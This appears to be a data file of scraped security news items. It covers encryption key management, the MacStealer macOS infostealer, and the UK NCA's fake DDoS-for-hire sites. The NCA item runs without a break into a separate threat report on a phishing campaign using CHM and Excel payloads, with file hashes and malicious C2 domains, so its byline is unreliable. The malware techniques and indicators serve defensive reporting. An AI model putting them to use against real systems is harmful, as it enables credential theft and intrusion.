      "text": " Tech News and AnalysisAs cloud infrastructure and compliance regulations become more complicated, companies are looking to simplify data security by adopting more pervasive encryption of sensitive data and consolidating key management into a single repository or service.On March 22, email and file security firm Virtru became the latest data-protection firm to offer customers a single vault for key management, when it announced a private keystore that works with Google Workspace, Google Cloud, and the company's other products. The product manages encryption keys, configures policies, and allows audits of access to encrypted data.Virtru had already offered encryption for email and files stored in the cloud, but the sensitivity of data and need for complying with government requirements led customers to ask for a \"hold-your-own-key,\" or HYOK, capability, says Mike Morper, senior vice president of product at Virtru.\"We have customers that have come to us, who ... want to ensure absolutely no entity other than the intended recipient has access to [a particular piece of] information,\" Morper says. \"We first started hearing this rooted in a lot of data-sovereignty conversations, particularly with some of our customers in Europe ... and it was paramount to them that they would have the ability to manage their own private keys.\"Moreover, a set of headaches — including managing keys, limiting who can access data, and auditing that access — have grown more severe as companies need to comply with privacy regulations from multiple countries and ensure the security of data across multiple clouds, says Kevin McKeogh, vice president of product management for data protection solutions at Entrust.\"Encrypting data is easy. Managing the keys that are used to encrypt the data is what becomes increasingly challenging for organizations as they scale operations,\" he says. \"With a growing volume of data now processed across distributed systems — on-premises and in multicloud environments — organizations need to maintain control of the keys to ensure data is protected and available to the applications that need to use the data, and to stay compliant to regulations.\"\"The typical enterprise has at least five different key managers deployed, so key sprawl is an issue,\" says Todd Moore, vice president of encryption products at Thales. \"This complicates things like key rotation and retiring keys. The best practice is to have one centralized key management platform that can support the vast majority of your key management operations.\"In addition, companies that rely on a single cloud provider's key management solution may be at greater risk. Privacy and data-protection regulations, such as the European General Data Protection Regulation (GDPR) and the Payment Card Industry's Data Security Standard (PCI-DSS), explicitly require — or heavily imply — that encrypting sensitive data is necessary and that self-custody of keys is preferred, says Andy Manoske, principal product manager for cryptography and security at HashiCorp.\"This is especially the case if data sovereignty requirements attempting to protect against a privileged adversary within a client's cloud service infrastructure are at play,\" he says. \"While an adversary may not be able to compromise that key management system, they could render it inoperable if they have privilege within a single cloud hosting both data encryption and key management.\"While a private keystore is a solution, it is not the only one. Key-management services that provide HYOK can satisfy government regulations and business security requirements, while still giving companies the expertise and support they need to manage a complex task. Keys need to be protected, but defenders must understand the company's threat model and what types of attacks are likely in order to best select the appropriate encryption technologies.Deploying encryption and maintaining a private keystore require some deep expertise within a company, Manoske says.\"Private keystores usually provide flexibility in how keys are retrieved and used for cryptography — a flexibility usually necessary when deploying cryptography within high-performance applications with significant automation,\" Manoske says. \"This flexibility comes at the cost of usually requiring more sophistication from the defender in protecting against side-channel attacks — attacks that 'go around' the mathematical protections of cryptography to tamper with or steal keys.\"While a company can retain ownership of critical keys, some KMaaS offerings can simplify the business' data security and provide necessary capabilities, such as access control and auditability, says Virtru's Morper.\"That's the hard part and, frankly, probably where the preponderance of adoption and friction come into play,\" he says. \"So it really starts to become a balance for organizations. It's a security-policy decision and a business decision they need to make — what level of friction is appropriate and against what degree of risk?\"Copyright © 2023 Informa PLC Informa UK Limited is a company registered in England and Wales with company number 1072954 whose registered office is 5 Howick Place, London, SW1P 1WG."

      "text": " A new info-stealing malware named MacStealer is targeting Mac users, stealing their credentials stored in the iCloud KeyChain and web browsers, cryptocurrency wallets, and potentially sensitive files.MacStealer is being distributed as a malware-as-a-service (MaaS), where the developer sells premade builds for $100, allowing purchasers to spread the malware in their campaigns.MacStealer was discovered by Uptycs analysts on a dark web hacking forum where the developer has been promoting it since the beginning of the month.The seller claims the malware is still in an early beta development phase and offers no panels or builders. Instead, it sells pre-built DMG payloads that can infect macOS Catalina, Big Sur, Monterey, and Ventura.The threat actor uses the lack of a builder and panel to justify the low price of $100 for the malware but promises that more advanced features will arrive soon.The malware developer claims that MacStealer can steal the following data from compromised systems:The Keychain database is a secure storage system in macOS that holds users' passwords, private keys, and certificates, encrypting it with their login password. The feature can then automatically enter login credentials on web pages and apps.The threat actors distribute MacStealer as an unsigned DMG file that poses as something the victim is tricked into executing on their macOS.Upon doing so, a fake password prompt is served to the victim to run a command that allows the malware to collect passwords from the compromised machine.The malware then collects all of the data mentioned in the previous section, stores them in a ZIP file, and sends the stolen data to remote command and control servers to be collected later by the threat actor.At the same time, MacStealer sends some basic information to a pre-configured Telegram channel, allowing the operator to be quickly notified when new data is stolen and download the ZIP file.While most MaaS operations target Windows users, macOS isn't immune to such threats, so its users should remain vigilant and avoid downloading files from untrustworthy websites.That information stealer also targeted credentials saved in browsers and cryptocurrency wallets, including Exodus, Phantom, Atomic, Electrum, and MetaMask.With cryptocurrency wallets being highly targeted by threat actors, we will likely see further malware developers targeting macOS in their search for cryptocurrency wallets to steal."

      "text": " Britain’s National Crime Agency (NCA) revealed on Friday that it had set up a number of fake DDoS-for-hire sites to infiltrate the online criminal underground.It said that users who registered for the sites were not given access to cybercrime tools but instead had their data collated by investigators.DDoS (distributed denial-of-service) attacks are among the least sophisticated forms of criminal cyber mischief. The attacks — which overwhelm network resources with traffic to effectively take them offline — are incapable of stealing or modifying data on the victim server.“Users based in the UK will be contacted by the National Crime Agency or police and warned about engaging in cyber crime. Information relating to those based overseas is being passed to international law enforcement,” the NCA said.The operation is not one of the more sophisticated busts that British cyber cops have been involved in, but provides police with a mechanism to intervene in the cases of potential offenders when they are engaged in what the NCA described as “an attractive entry-level crime.”According to the NCA the fake sites have so far been accessed by around several thousand people. One of them was replaced Friday with a splash page warning that the NCA, alongside the Dutch Politie and the German Bundeskriminalamt, had created and controlled the site.“Operation PowerOFF has already resulted in the arrest of numerous individuals and continues to ensure that users are being held accountable for their criminal activity,” the splash page states.Alan Merrett, from the agency’s National Cyber Crime Unit, stated: “We will not reveal how many sites we have, or for how long they have been running. Going forward, people who wish to use these services can’t be sure who is actually behind them, so why take the risk?”Friday’s announcement follows the NCA helping to take down 48 of the world’s most popular booster sites last December and arresting an 18-year-old man in Devon on suspicion of administering one of the sites.“Traditional site takedowns and arrests are key components of law enforcement’s response to this threat. However, we have extended our operational capability with this activity, at the same time as undermining trust in the criminal market,” added Merrett.Alexander Martin is the UK Editor for Recorded Future News.

For some of the payloads we have corresponding phishing emails that were used as lures to deliver the files, allowing analysis of the social engineering techniques used. We have noted updates to the first-stage payloads used, with new layers of obfuscation to hinder analysis and additional decoys used for social engineering. The emails contain a number of social engineering techniques. The name and email address used to send the phishing emails is crafted to look like it is coming from an “Embassy in Beijing.” A free email provider is used, therefore domain reputation checks will not be useful. The email is signed off with the name and details of an actual attaché of the Kyrgyz embassy in China. If the recipient were to use a search engine to check for this employee, they would easily be able to find corroborating information from LinkedIn and the Ministry of Foreign Affairs website for Kyrgyzstan, adding to the supposed legitimacy of the email. This is presumably also how the malicious actor was able to get information in order to craft the lure. The email subject and body use terms and themes that would be familiar with the recipients in governmental and energy sectors, such as International Atomic Energy Agency (IAEA), China Institute of International Studies (CIIS), strategic alliances, and nuclear doctrines. Multiple payloads have been observed being delivered. Either CHM files, or Microsoft Excel files with Equation Editor exploits. These payloads are compressed inside RAR files, this helps avoid static analysis techniques that do not decompress the files first. The purpose of the payloads are to create persistence and download further malware payloads. We were not able to get further additional payloads from the command and control (C2) servers, but in some instances were able to get the file names of next stages from active C2s. The second scheduled task created attempts to execute the payload downloaded by the other task: The more common payloads contained within the RAR files are Microsoft Compiled HTML Help (CHM) files. These can be used to simply execute arbitrary code, in these cases, they are also used to create scheduled tasks for persistence and downloading of the next stage. We have noted multiple versions of these CHM payloads. CHM payloads are useful for the actor as it requires a low amount of user interaction, it does not require a vulnerable version of Microsoft Office installed like the Excel files, and it also uses LZX compression that will bypass static malware analysis solutions that do not decompress the file.We did not fetch any additional payloads from the C2, but we were served empty MSI files, allowing us to discover the names of the next stage payloads. The decoded command is the following:It is evident that the C2 controllers have been updated also as now only the computer name is sent to the C2 and not the username. What is interesting about the next version is that it now contains a decoy picture when opened:The decoy appears to reference the United Front Work Department of the Central Committee of the Chinese Communist Party. The following is a machine translated version of the same picture for reference (please note that the translation will not be fully accurate and should be used for reference purposes only):Always take care when handling attachments, and never open CHM files as they are antiquated and not commonly used for legitimate purposes currently.– Want to learn more about automating your pipeline for phishing email investigations with Intezer?–5f663f15701f429f17cc309d10ca03ee00fd20f733220cc9d2502eff5d0cd1a1 (Email)eb7aebded5549f8b006e19052e0d03dc9095c75a800897ff14ef872f18c8650e (Email)cac239cf09a6a5bc1f9a3b29141336773c957d570212b97f73e13122fe032179 (Email)8d2f6b0d7a6a06708593cc64d9187878ea9d2cc3ae9a657926aa2a8522b93f74 (Email)33905e2db3775d2e8e75c61e678d193ac2bab5b5a89d798effbceb9ab202d799  (Email)5c85194ade91736a12b1eeeb13baa0b0da88c5085ca0530c4f1d86342170b3bc (Email)Ef4fb1dc3d1ca5ea8a88cd94596722b93524f928d87dff0d451d44da4e9181f1 (Email)b2566755235c1df3371a7650d94339e839efaa85279656aa9ab4dc4f2d94bbfa (RAR)33a20950e7f4b2191706ddf9089f1e91be1e5384cca00a57cf6b58056f70c96b (RAR)7e7e90b076ef3ea4ef8ed4ef14fb599a2acb15d9ce00c78e5949186da1e355cf (RAR)qwavemediaservice[.]netmirzadihatti[.]comcoauthcn[.]comRyan is a security researcher analyzing malware and scripts.
